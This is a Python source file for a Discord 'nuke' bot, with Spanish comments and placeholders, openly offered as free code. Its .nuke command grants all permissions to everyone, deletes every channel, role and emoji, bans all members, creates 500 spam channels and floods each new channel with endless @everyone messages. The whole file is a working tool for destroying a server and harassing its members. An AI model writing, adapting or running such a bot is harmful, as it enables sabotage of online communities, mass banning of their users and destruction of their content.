import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
from webserver import keep_alive
token = "token de tu bot"



SPAM_CHANNEL =  ["uwu"]
SPAM_MESSAGE = ["@everyone mensaje que quieres que spammee (no quites el everyone)"]
SET_NAME = ["nombre de el servidores"]
SET_ICON = ["enlace de una foto o gif"]

client = commands.Bot(command_prefix=".")

keep_alive()
@client.event
async def on_ready():
   print(''' 
   
 ██▓███   █    ██  ▄▄▄▄    ██▓     ██▓ ▄████▄      ██▀███  ▄▄▄       ██▓▓█████▄     ▄▄▄▄    ▒█████  ▄▄▄█████▓
▓██░  ██▒ ██  ▓██▒▓█████▄ ▓██▒    ▓██▒▒██▀ ▀█     ▓██ ▒ ██▒████▄    ▓██▒▒██▀ ██▌   ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
▓██░ ██▓▒▓██  ▒██░▒██▒ ▄██▒██░    ▒██▒▒▓█    ▄    ▓██ ░▄█ ▒██  ▀█▄  ▒██▒░██   █▌   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
▒██▄█▓▒ ▒▓▓█  ░██░▒██░█▀  ▒██░    ░██░▒▓▓▄ ▄██▒   ▒██▀▀█▄ ░██▄▄▄▄██ ░██░░▓█▄   ▌   ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
▒██▒ ░  ░▒▒█████▓ ░▓█  ▀█▓░██████▒░██░▒ ▓███▀ ░   ░██▓ ▒██▒▓█   ▓██▒░██░░▒████▓    ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░▒▓███▀▒░ ▒░▓  ░░▓  ░ ░▒ ▒  ░   ░ ▒▓ ░▒▓░▒▒   ▓▒█░░▓   ▒▒▓  ▒    ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
░▒ ░     ░░▒░ ░ ░ ▒░▒   ░ ░ ░ ▒  ░ ▒ ░  ░  ▒        ░▒ ░ ▒░ ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒    ▒░▒   ░   ░ ▒ ▒░     ░    
░░        ░░░ ░ ░  ░    ░   ░ ░    ▒ ░░             ░░   ░  ░   ▒    ▒ ░ ░ ░  ░     ░    ░ ░ ░ ░ ▒    ░      
            ░      ░          ░  ░ ░  ░ ░            ░          ░  ░ ░     ░        ░          ░ ░           
                        ░             ░                                  ░               ░                   
                                         
Made by yung rito.#0001
 ''')
   await client.change_presence(activity=discord.Game(name="free code | github.com/eosdestroyers"))


@client.command()
@commands.is_owner()
async def STOP(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} He cerrado sesion correctamente" + Fore.RESET)


#Nuke
@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "He dado permisos a todos los miembros del servidor" + Fore.RESET)
    except:
      print(Fore.GREEN + "No puedo dar todos los permisos a cierto/s miembro/s del servidor" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} Ha sido borrado" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} NO ha sido borrado" + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Ha sido baneado" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} NO ha sido baneado" + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Ha sido borrado" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} NO ha sido borrado" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Ha sido borrado" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} NO ha sido borrado" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("ƉĦɌɄVツ#8276")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Ha sido desbaneado" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} NO ha sido desbaneado" + Fore.RESET)
    await guild.create_text_channel("nombre de canal que quieres que spamme")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"Nueva invitacion: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"He nukeado {guild.name} correctamente")
    return



#Spam.Message
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))





client.run(token, bot=True)
